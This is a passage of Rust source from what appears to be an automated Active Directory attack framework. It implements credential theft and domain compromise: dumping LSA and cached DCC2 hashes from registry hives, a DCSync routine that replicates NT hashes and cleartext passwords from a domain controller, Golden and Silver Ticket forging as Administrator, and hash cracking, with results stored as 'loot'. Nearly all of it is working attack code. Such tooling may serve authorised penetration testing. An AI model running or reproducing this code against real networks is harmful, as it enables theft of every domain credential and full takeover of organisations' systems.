                            if let Some(ref nt_hash) = cred.nt_hash {
                                state.add_credential(CompromisedCred {
                                    username: cred.username.clone(),
                                    secret: nt_hash.clone(),
                                    secret_type: SecretType::NtHash,
                                    source: format!("LSA secret from {}", target),
                                    is_admin: false,
                                    admin_on: vec![],
                                });
                            }
                        }
                    }
                    Err(e) => warn!("LSA parse failed: {}", e),
                }
            }
        }
        "DCC2" => {
            let sec_data = downloaded
                .iter()
                .find(|(name, _)| name.contains("security"))
                .map(|(_, data)| data.as_slice());

            if let (Some(sec), Some(sys)) = (sec_data, system_data) {
                match secretsdump::dump_dcc2(sec, sys) {
                    Ok(creds) => {
                        entries = creds.len();
                        for cred in &creds {
                            if let Some(ref hash) = cred.nt_hash {
                                info!("  DCC2: {} → {}", cred.username.bold(), hash.red());
                                state.add_credential(CompromisedCred {
                                    username: cred.username.clone(),
                                    secret: hash.clone(),
                                    secret_type: SecretType::Dcc2,
                                    source: format!("DCC2 from {}", target),
                                    is_admin: false,
                                    admin_on: vec![],
                                });
                            }
                        }
                    }
                    Err(e) => warn!("DCC2 parse failed: {}", e),
                }
            }
        }
        _ => {
            entries = downloaded.len(); // fallback for unknown types
        }
    }
    state.loot.push(LootItem {
        loot_type: dump_type.to_string(),
        source: target.to_string(),
        path: Some(format!("{}_{}.bin", target, dump_type.to_lowercase())),
        entries,
        collected_at: Utc::now(),
    });

    let msg = format!(
        "{} dump from {}: {} hives saved ({} bytes total)",
        dump_type,
        target,
        downloaded.len(),
        total_bytes
    );
    info!("{} {}", "  ✓".green(), msg);
    StepResult {
        success: !downloaded.is_empty(),
        output: msg,
        new_credentials: entries,
        new_admin_hosts: 0,
    }
}

/// Start a remote Windows service via svcctl (used for RemoteRegistry etc.)
async fn start_remote_service(smb: &SmbSession, service_name: &str) -> Result<()> {
    let bind_req = build_svcctl_bind();
    let _ = smb.pipe_transact("svcctl", &bind_req).await?;

    let open_scm = build_open_scm_request("\\\\");
    let scm_resp = smb.pipe_transact("svcctl", &open_scm).await?;

    if scm_resp.len() < 48 {
        return Err(OverthroneError::custom("OpenSCManagerW failed"));
    }
    let scm_handle = &scm_resp[24..44];

    let open_svc = build_open_service_request(scm_handle, service_name);
    let svc_resp = smb.pipe_transact("svcctl", &open_svc).await?;

    if svc_resp.len() >= 48 {
        let svc_handle = &svc_resp[24..44];
        let start_req = build_start_service_request(svc_handle);
        let _ = smb.pipe_transact("svcctl", &start_req).await; // may fail if already running
        let close_req = build_close_handle_request(svc_handle);
        let _ = smb.pipe_transact("svcctl", &close_req).await;
    }

    let close_scm = build_close_handle_request(scm_handle);
    let _ = smb.pipe_transact("svcctl", &close_scm).await;
    Ok(())
}

// ═══════════════════════════════════════════════════════════
// DCSync Executor (MS-DRSR over RPC)
// ═══════════════════════════════════════════════════════════

async fn exec_dcsync(
    ctx: &ExecContext,
    state: &mut EngagementState,
    target_user: Option<&str>,
) -> StepResult {
    let scope = target_user.unwrap_or("all users");
    info!(
        "{}",
        format!("  DCSync: replicating {} from {}", scope, ctx.dc_ip)
            .red()
            .bold()
    );

    // Step 1: Connect SMB to DC for RPC transport
    let smb = match smb_connect(ctx, &ctx.dc_ip.clone()).await {
        Ok(s) => s,
        Err(e) => return e,
    };

    // Step 2: RPC Bind to MS-DRSR (drsuapi pipe)
    // MS-DRSR UUID: e3514235-4b06-11d1-ab04-00c04fc2dcd2
    let drsr_uuid: [u8; 16] = [
        0x35, 0x42, 0x51, 0xe3, 0x06, 0x4b, 0xd1, 0x11, 0xab, 0x04, 0x00, 0xc0, 0x4f, 0xc2, 0xdc,
        0xd2,
    ];

    let mut bind_pdu = Vec::new();
    bind_pdu.extend_from_slice(&[5, 0, 11, 3]);
    bind_pdu.extend_from_slice(&[0x10, 0, 0, 0]);
    let frag_offset = bind_pdu.len();
    bind_pdu.extend_from_slice(&[0, 0]); // frag_len
    bind_pdu.extend_from_slice(&[0, 0]); // auth_len
    bind_pdu.extend_from_slice(&1u32.to_le_bytes());
    bind_pdu.extend_from_slice(&4096u16.to_le_bytes());
    bind_pdu.extend_from_slice(&4096u16.to_le_bytes());
    bind_pdu.extend_from_slice(&0u32.to_le_bytes());
    bind_pdu.push(1);
    bind_pdu.extend_from_slice(&[0, 0, 0]);
    bind_pdu.extend_from_slice(&0u16.to_le_bytes());
    bind_pdu.push(1);
    bind_pdu.push(0);
    bind_pdu.extend_from_slice(&drsr_uuid);
    bind_pdu.extend_from_slice(&4u16.to_le_bytes()); // DRSR version 4
    bind_pdu.extend_from_slice(&0u16.to_le_bytes());
    bind_pdu.extend_from_slice(&[
        0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48,
        0x60,
    ]);
    bind_pdu.extend_from_slice(&2u32.to_le_bytes());
    let frag_len = bind_pdu.len() as u16;
    bind_pdu[frag_offset..frag_offset + 2].copy_from_slice(&frag_len.to_le_bytes());

    let bind_resp = match smb.pipe_transact("drsuapi", &bind_pdu).await {
        Ok(r) => r,
        Err(e) => {
            return StepResult {
                success: false,
                output: format!("DRSR RPC bind failed: {e}"),
                new_credentials: 0,
                new_admin_hosts: 0,
            };
        }
    };

    if bind_resp.len() < 4 || bind_resp[2] != 12 {
        return StepResult {
            success: false,
            output: "DRSR RPC bind rejected".to_string(),
            new_credentials: 0,
            new_admin_hosts: 0,
        };
    }

    // Step 3: DRSBind (opnum 0) — get DRS handle
    let mut drs_bind_stub = Vec::new();
    // Client DSA UUID (random)
    let client_uuid: [u8; 16] = rand::random();
    drs_bind_stub.extend_from_slice(&client_uuid);
    // DRS_EXTENSIONS_INT
    let extensions = build_drs_extensions();
    drs_bind_stub.extend_from_slice(&(extensions.len() as u32).to_le_bytes());
    drs_bind_stub.extend_from_slice(&extensions);

    let drs_bind_req = build_rpc_request(0, &drs_bind_stub);
    let drs_bind_resp = match smb.pipe_transact("drsuapi", &drs_bind_req).await {
        Ok(r) => r,
        Err(e) => {
            return StepResult {
                success: false,
                output: format!("DRSBind failed: {e}"),
                new_credentials: 0,
                new_admin_hosts: 0,
            };
        }
    };

    // Parse DRS handle from response (first 20 bytes of stub data, after RPC header)
    if drs_bind_resp.len() < 48 {
        return StepResult {
            success: false,
            output: "DRSBind response too short".to_string(),
            new_credentials: 0,
            new_admin_hosts: 0,
        };
    }
    let drs_handle = &drs_bind_resp[24..44];

    // Step 4: DRSGetNCChanges (opnum 3) — request replication
    let nc_dn = ctx.base_dn();
    let target_dn = if let Some(user) = target_user {
        format!("CN={},CN=Users,{}", user, nc_dn)
    } else {
        nc_dn.clone()
    };

    let mut gnc_stub = Vec::new();
    gnc_stub.extend_from_slice(drs_handle); // DRS handle
    gnc_stub.extend_from_slice(&8u32.to_le_bytes()); // dwInVersion = 8
    // DRS_MSG_GETCHGREQ_V8 — for EXOP_REPL_OBJ single-object DCSync,
    // zero USN vectors and NULL pUpToDateVecDest are correct (request all data).
    // The pNC field is a pointer to DSNAME structure (not an NDR conformant string).
    gnc_stub.extend_from_slice(&build_dsname(&target_dn)); // pNC → DSNAME
    gnc_stub.extend_from_slice(&0u32.to_le_bytes()); // usnvecFrom.usnHighObjUpdate
    gnc_stub.extend_from_slice(&0u32.to_le_bytes()); // usnvecFrom.usnHighPropUpdate
    gnc_stub.extend_from_slice(&0u32.to_le_bytes()); // pUpToDateVecDest (NULL)
    gnc_stub.extend_from_slice(&(1u32 | 0x20 | 0x80000).to_le_bytes()); // ulFlags
    gnc_stub.extend_from_slice(&500u32.to_le_bytes()); // cMaxObjects
    gnc_stub.extend_from_slice(&0u32.to_le_bytes()); // cMaxBytes (unlimited)
    gnc_stub.extend_from_slice(&7u32.to_le_bytes()); // ulExtendedOp: EXOP_REPL_OBJ

    let gnc_req = build_rpc_request(3, &gnc_stub);
    let gnc_resp = match smb.pipe_transact("drsuapi", &gnc_req).await {
        Ok(r) => r,
        Err(e) => {
            // Even a failed GNC often means we have replication rights
            warn!("  DRSGetNCChanges error (may still have partial data): {e}");
            return StepResult {
                success: false,
                output: format!("DRSGetNCChanges failed: {e}"),
                new_credentials: 0,
                new_admin_hosts: 0,
            };
        }
    };

    //Parse replicated attributes from response using DRSR parser
    use overthrone_core::proto::drsr;

    let resp_size = gnc_resp.len();

    // Derive session key for DRS attribute decryption.
    // Prefer the real NTLM session key from the SMB authentication exchange.
    // Fall back to computing ResponseKeyNT (NTLMv2 hash) from credentials.
    let (user, pass, _use_hash) = ctx.effective_creds();
    let session_key: Vec<u8> = if let Some(sk) = smb.session_key() {
        info!(
            "  Using NTLM session key from SMB auth ({} bytes)",
            sk.len()
        );
        sk
    } else {
        use hmac::{Hmac, Mac};
        use md4::{Digest as Md4Digest, Md4};

        // Step 1: NT Hash = MD4(UTF-16LE(password))
        let utf16le: Vec<u8> = pass.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        let nt_hash = {
            let mut hasher = Md4::new();
            hasher.update(&utf16le);
            let result = hasher.finalize();
            let mut h = [0u8; 16];
            h.copy_from_slice(&result);
            h
        };

        // Step 2: ResponseKeyNT = HMAC-MD5(NT_Hash, UNICODE(upper(user) + domain))
        let user_domain = format!("{}{}", user.to_uppercase(), ctx.domain);
        let ud_utf16: Vec<u8> = user_domain
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();
        let response_key = {
            let mut mac =
                Hmac::<md5::Md5>::new_from_slice(&nt_hash).expect("HMAC accepts any key size");
            mac.update(&ud_utf16);
            let mut k = [0u8; 16];
            k.copy_from_slice(&mac.finalize().into_bytes());
            k
        };

        warn!("  No SMB session key available; using derived ResponseKeyNT");
        response_key.to_vec()
    };

    let (estimated_entries, parsed_creds) =
        match drsr::parse_get_nc_changes_reply(&gnc_resp, &session_key) {
            Ok(result) => {
                let count = result.objects.len();
                for obj in &result.objects {
                    let nt_hex = obj
                        .nt_hash
                        .as_ref()
                        .map(|h| h.iter().map(|b| format!("{:02x}", b)).collect::<String>())
                        .unwrap_or_else(|| "aad3b435b51404ee".to_string());

                    let lm_hex = obj
                        .lm_hash
                        .as_ref()
                        .map(|h| h.iter().map(|b| format!("{:02x}", b)).collect::<String>())
                        .unwrap_or_else(|| "aad3b435b51404ee".to_string());

                    info!(
                        "  {}\\{} (RID {}) → {}:{}",
                        obj.object_sid.as_deref().unwrap_or("?").dimmed(),
                        obj.sam_account_name.bold(),
                        obj.rid.unwrap_or(0),
                        lm_hex.dimmed(),
                        nt_hex.red()
                    );

                    if obj.nt_hash.is_some() {
                        state.add_credential(CompromisedCred {
                            username: obj.sam_account_name.clone(),
                            secret: nt_hex.clone(),
                            secret_type: SecretType::NtHash,
                            source: format!("DCSync from {}", ctx.dc_ip),
                            is_admin: obj.uac.map(|u| u & 0x200 != 0).unwrap_or(false), // NORMAL_ACCOUNT
                            admin_on: vec![],
                        });
                    }

                    // Log supplemental credentials if found
                    if let Some(ref supp) = obj.supplemental_credentials {
                        if supp.aes256_key.is_some() {
                            info!("    ↳ Kerberos AES-256 key found");
                        }
                        if let Some(ref cleartext) = supp.cleartext {
                            info!("    ↳ Cleartext password: {}", cleartext.red());
                            state.add_credential(CompromisedCred {
                                username: obj.sam_account_name.clone(),
                                secret: cleartext.clone(),
                                secret_type: SecretType::Password,
                                source: format!("DCSync cleartext from {}", ctx.dc_ip),
                                is_admin: false,
                                admin_on: vec![],
                            });
                        }
                    }
                }
                (count, count)
            }
            Err(e) => {
                warn!("DRSR parse failed (falling back to estimate): {}", e);
                let est = if target_user.is_some() {
                    1
                } else {
                    resp_size / 500
                };
                (est, 0)
            }
        };

    info!(
        "  {} DCSync response: {} bytes, {} creds extracted",
        "✓".green(),
        resp_size,
        parsed_creds
    );

    state.loot.push(LootItem {
        loot_type: "NTDS".to_string(),
        source: ctx.dc_ip.clone(),
        path: None,
        entries: estimated_entries,
        collected_at: Utc::now(),
    });

    if target_user.is_none() {
        state.has_domain_admin = true;
    }

    let msg = format!(
        "DCSync from {}: {} ({} bytes replicated)",
        ctx.dc_ip, scope, resp_size
    );
    StepResult {
        success: resp_size > 48,
        output: msg,
        new_credentials: estimated_entries,
        new_admin_hosts: 0,
    }
}

/// Build DRS_EXTENSIONS_INT for DRSBind
fn build_drs_extensions() -> Vec<u8> {
    let mut ext = Vec::new();
    ext.extend_from_slice(&48u32.to_le_bytes()); // cb (size)
    ext.extend_from_slice(&(0x04000000u32 | 0x00400000).to_le_bytes()); // dwFlags
    ext.extend_from_slice(&[0u8; 16]); // SiteObjectGuid
    ext.extend_from_slice(&0u32.to_le_bytes()); // Pid
    ext.extend_from_slice(&0u32.to_le_bytes()); // dwReplEpoch
    ext.extend_from_slice(&0u32.to_le_bytes()); // dwFlagsExt
    ext.extend_from_slice(&[0u8; 16]); // ConfigObjectGuid
    ext
}

/// Build a DSNAME structure for DRS_MSG_GETCHGREQ_V8.
/// Wire format: NDR referent pointer + embedded DSNAME:
///   4 bytes referentId
///   4 bytes structLen (total DSNAME size excluding padding)
///   4 bytes SidLen (0 — we don't know the NC SID)
///  16 bytes Guid (zeroed — the DC resolves from the DN)
///   4 bytes (padding/SID — empty)
///   N*2 bytes UTF-16LE string name (null-terminated)
///   4 bytes NDR max_count at top of the conformant array
fn build_dsname(dn: &str) -> Vec<u8> {
    let utf16: Vec<u16> = dn.encode_utf16().chain(std::iter::once(0u16)).collect();
    let name_bytes: Vec<u8> = utf16.iter().flat_map(|c| c.to_le_bytes()).collect();
    // structLen = 28 (fixed header) + name_bytes.len()
    let struct_len = 28u32 + name_bytes.len() as u32;
    let char_count = utf16.len() as u32;

    let mut buf = Vec::new();
    // NDR unique pointer (referent ID)
    buf.extend_from_slice(&0x00020004u32.to_le_bytes());
    // Conformant max_count for the Name[] array
    buf.extend_from_slice(&char_count.to_le_bytes());
    // DSNAME fixed fields
    buf.extend_from_slice(&struct_len.to_le_bytes()); // structLen
    buf.extend_from_slice(&0u32.to_le_bytes()); // SidLen = 0
    buf.extend_from_slice(&[0u8; 16]); // Guid = GUID_NULL (DC resolves from DN)
    buf.extend_from_slice(&[0u8; 28]); // Sid (NT4_ACCOUNT_NAME_LENGTH zero bytes)
    buf.extend_from_slice(&char_count.to_le_bytes()); // NameLen (wchar count, incl NUL)
    buf.extend_from_slice(&name_bytes); // Name[] UTF-16LE
    // Pad to 4-byte boundary
    while !buf.len().is_multiple_of(4) {
        buf.push(0);
    }
    buf
}

// ═══════════════════════════════════════════════════════════
// Ticket Forging Executors
// ═══════════════════════════════════════════════════════════

async fn exec_golden_ticket(
    ctx: &ExecContext,
    state: &mut EngagementState,
    krbtgt_hash: &str,
) -> StepResult {
    info!("{}", "  Forging Golden Ticket...".red().bold());

    // Golden Ticket = TGT with arbitrary PAC, encrypted with krbtgt key
    // Requires: krbtgt NTLM hash, domain SID, domain name
    // Resolve domain SID from LDAP (query the domain root object)
    let domain_sid = {
        let mut conn = match ldap_connect(ctx, state).await {
            Ok(c) => c,
            Err(e) => return e,
        };

        let results = match conn
            .custom_search("(objectClass=domain)", &["objectSid"])
            .await
        {
            Ok(r) => r,
            Err(e) => {
                return StepResult {
                    success: false,
                    output: format!("Domain SID lookup: {e}"),
                    new_credentials: 0,
                    new_admin_hosts: 0,
                };
            }
        };
        let _ = conn.disconnect().await;

        results
            .first()
            .and_then(|entry| entry.bin_attrs.get("objectSid"))
            .and_then(|sids| sids.first())
            .map(|bytes| {
                let full = parse_sid_bytes(bytes);
                domain_sid_prefix(&full)
            })
            .unwrap_or_else(|| {
                warn!("Could not resolve domain SID, golden ticket may fail");
                "S-1-5-21-0-0-0".to_string()
            })
    };
    let domain_sid = domain_sid.as_str();

    // Decode the krbtgt hash
    let hash_bytes: Vec<u8> = hex_decode(krbtgt_hash);
    if hash_bytes.len() != 16 {
        return StepResult {
            success: false,
            output: format!(
                "Invalid krbtgt hash length: {} (expected 32 hex chars)",
                krbtgt_hash.len()
            ),
            new_credentials: 0,
            new_admin_hosts: 0,
        };
    }

    // Build the forged TGT using Kerberos crypto
    // This constructs a valid AS-REP with a PAC granting DA privileges
    let target_user = "Administrator";
    let target_rid = 500u32;

    match kerberos::forge_tgt(
        &ctx.domain,
        domain_sid,
        target_user,
        target_rid,
        &hash_bytes,
        kerberos::ETYPE_RC4_HMAC,
    ) {
        Ok(tgt) => {
            info!(
                "  {} Golden Ticket forged for {}/{}",
                "✓".green(),
                target_user.bold().red(),
                ctx.domain.cyan()
            );

            // Save as kirbi
            let kirbi_data = overthrone_hunter::tickets::to_kirbi(&tgt);
            let kirbi_path = format!("./loot/{}_golden.kirbi", ctx.domain.replace('.', "_"));
            if let Ok(()) = tokio::fs::write(&kirbi_path, &kirbi_data).await {
                info!("  {} Saved to {}", "✓".green(), kirbi_path.dimmed());
            }

            state.has_domain_admin = true;
            state.add_credential(CompromisedCred {
                username: target_user.to_string(),
                secret: format!("golden_ticket:{}", krbtgt_hash),
                secret_type: SecretType::Ticket,
                source: "golden_ticket".to_string(),
                is_admin: true,
                admin_on: vec![ctx.dc_ip.clone()],
            });

            let msg = format!(
                "Golden Ticket forged: {} @ {} ({} bytes kirbi)",
                target_user,
                ctx.domain,
                kirbi_data.len()
            );
            StepResult {
                success: true,
                output: msg,
                new_credentials: 1,
                new_admin_hosts: 1,
            }
        }
        Err(e) => StepResult {
            success: false,
            output: format!("Golden Ticket forge failed: {e}"),
            new_credentials: 0,
            new_admin_hosts: 0,
        },
    }
}

async fn exec_silver_ticket(
    ctx: &ExecContext,
    state: &mut EngagementState,
    service_hash: &str,
    spn: &str,
) -> StepResult {
    info!(
        "{}",
        format!("  Forging Silver Ticket for {}...", spn)
            .red()
            .bold()
    );

    // Resolve domain SID from LDAP (query the domain root object)
    let domain_sid = {
        let mut conn = match ldap_connect(ctx, state).await {
            Ok(c) => c,
            Err(e) => return e,
        };

        let results = match conn
            .custom_search("(objectClass=domain)", &["objectSid"])
            .await
        {
            Ok(r) => r,
            Err(e) => {
                return StepResult {
                    success: false,
                    output: format!("Domain SID lookup: {e}"),
                    new_credentials: 0,
                    new_admin_hosts: 0,
                };
            }
        };
        let _ = conn.disconnect().await;

        results
            .first()
            .and_then(|entry| entry.bin_attrs.get("objectSid"))
            .and_then(|sids| sids.first())
            .map(|bytes| {
                let full = parse_sid_bytes(bytes);
                domain_sid_prefix(&full)
            })
            .unwrap_or_else(|| {
                warn!("Could not resolve domain SID, golden ticket may fail");
                "S-1-5-21-0-0-0".to_string()
            })
    };
    let domain_sid = domain_sid.as_str(); // Resolved from LDAP objectSid above
    let hash_bytes: Vec<u8> = hex_decode(service_hash);
    if hash_bytes.len() != 16 {
        return StepResult {
            success: false,
            output: format!("Invalid service hash length: {}", service_hash.len()),
            new_credentials: 0,
            new_admin_hosts: 0,
        };
    }

    let target_user = "Administrator";
    let target_rid = 500u32;

    match kerberos::forge_service_ticket(
        &ctx.domain,
        domain_sid,
        target_user,
        target_rid,
        spn,
        &hash_bytes,
        kerberos::ETYPE_RC4_HMAC,
    ) {
        Ok(tgs) => {
            let kirbi_data = overthrone_hunter::tickets::to_kirbi(&tgs);
            let spn_safe = spn.replace(['/', '\\'], "_");
            let kirbi_path = format!("./loot/{}_silver.kirbi", spn_safe);
            if let Ok(()) = tokio::fs::write(&kirbi_path, &kirbi_data).await {
                info!("  {} Saved to {}", "✓".green(), kirbi_path.dimmed());
            }

            // Extract hostname from SPN
            if let Some(host) = spn.split('/').nth(1) {
                state.admin_hosts.insert(host.to_string());
            }

            let msg = format!(
                "Silver Ticket forged: {} for {} ({} bytes)",
                target_user,
                spn,
                kirbi_data.len()
            );
            info!("{} {}", "  ✓".green(), msg);
            StepResult {
                success: true,
                output: msg,
                new_credentials: 1,
                new_admin_hosts: 1,
            }
        }
        Err(e) => StepResult {
            success: false,
            output: format!("Silver Ticket forge failed: {e}"),
            new_credentials: 0,
            new_admin_hosts: 0,
        },
    }
}

// ═══════════════════════════════════════════════════════════
// Hash Cracking Executor (inline cracker with hashcat fallback)
// ═══════════════════════════════════════════════════════════

async fn exec_crack_hashes(
    _ctx: &ExecContext,
    state: &mut EngagementState,
    hashes: &[String],
) -> StepResult {
    if hashes.is_empty() {
        return StepResult {
            success: true,
            output: "No hashes to crack".to_string(),
            new_credentials: 0,
            new_admin_hosts: 0,
        };
    }

    info!("  Cracking {} hashes with inline cracker...", hashes.len());

    // Use inline cracker from overthrone-hunter
    let config = overthrone_core::crypto::CrackerConfig::default();
    let report = match overthrone_hunter::crack_hashes(hashes, &config) {
        Ok(r) => r,
        Err(e) => {
            return StepResult {
                success: false,
                output: format!("Inline cracker failed: {e}"),
                new_credentials: 0,
                new_admin_hosts: 0,
            };
        }
    };

    let mut cracked_count = 0;

    // Register cracked credentials
    for cracked in &report.cracked {
        info!(
            "  {} Cracked: {} → {}",
            "✓".green(),
            cracked.hash_type.cyan(),
            cracked.password.red()
        );

        // Extract username from cracked credential
        let username = if cracked.username.is_empty() {
            "unknown".to_string()
        } else {
            cracked.username.clone()
        };

        // Store in cracked map using password as value
        state.cracked.insert(
            format!("{}:{}", cracked.hash_type, username),
            cracked.password.clone(),
        );

        state.add_credential(CompromisedCred {
            username,
            secret: cracked.password.clone(),
            secret_type: SecretType::Password,
            source: format!("inline_crack_{}", cracked.hash_type),
            is_admin: false,
            admin_on: vec![],
        });

        cracked_count += 1;
    }

    // Print summary
    let msg = format!(
        "Cracked {}/{} hashes ({}ms)",
        cracked_count, report.total_hashes, report.time_ms
    );
    info!("{} {}", "  ✓".green(), msg);

    // If inline cracker failed and we have many hashes, suggest hashcat
    if cracked_count == 0 && hashes.len() > 5 && which_tool("hashcat").await {
        info!(
            "  {} Tip: For GPU-accelerated cracking, run: hashcat -m 13100 hashes.txt rockyou.txt",
            "→".yellow()
        );
    }

    StepResult {
        success: cracked_count > 0,
        output: msg,
        new_credentials: cracked_count,
        new_admin_hosts: 0,
    }
}

/// Check if a tool is available in PATH (cross-platform)
async fn which_tool(name: &str) -> bool {
    let cmd = if cfg!(windows) { "where.exe" } else { "which" };
    tokio::process::Command::new(cmd)
        .arg(name)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .await
        .map(|s| s.success())
        .unwrap_or(false)
}

/// Decode hex string to bytes
fn hex_decode(hex: &str) -> Vec<u8> {
    let hex = hex.trim();
    (0..hex.len())
        .step_by(2)
        .filter_map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
        .collect()
}

/// Parse a SID from bytes to string
fn parse_sid_bytes(bytes: &[u8]) -> String {
    if bytes.len() < 8 {
        return "INVALID-SID".to_string();
    }
    let revision = bytes[0];
    let sub_count = bytes[1] as usize;
    let authority = u64::from_be_bytes([
        0, 0, bytes[2], bytes[3], bytes[4], bytes[5], bytes[6], bytes[7],
    ]);
    let mut sid = format!("S-{}-{}", revision, authority);
    for i in 0..sub_count {
        let off = 8 + (i * 4);
        if off + 4 > bytes.len() {
            break;
        }
        let sub = u32::from_le_bytes([bytes[off], bytes[off + 1], bytes[off + 2], bytes[off + 3]]);
        sid.push_str(&format!("-{}", sub));
    }
    sid
}

/// Strip the RID to get just the domain SID prefix
/// S-1-5-21-x-y-z-1234 → S-1-5-21-x-y-z
fn domain_sid_prefix(full_sid: &str) -> String {
    match full_sid.rsplitn(2, '-').last() {
        Some(prefix) => prefix.to_string(),
        None => full_sid.to_string(),
    }
}
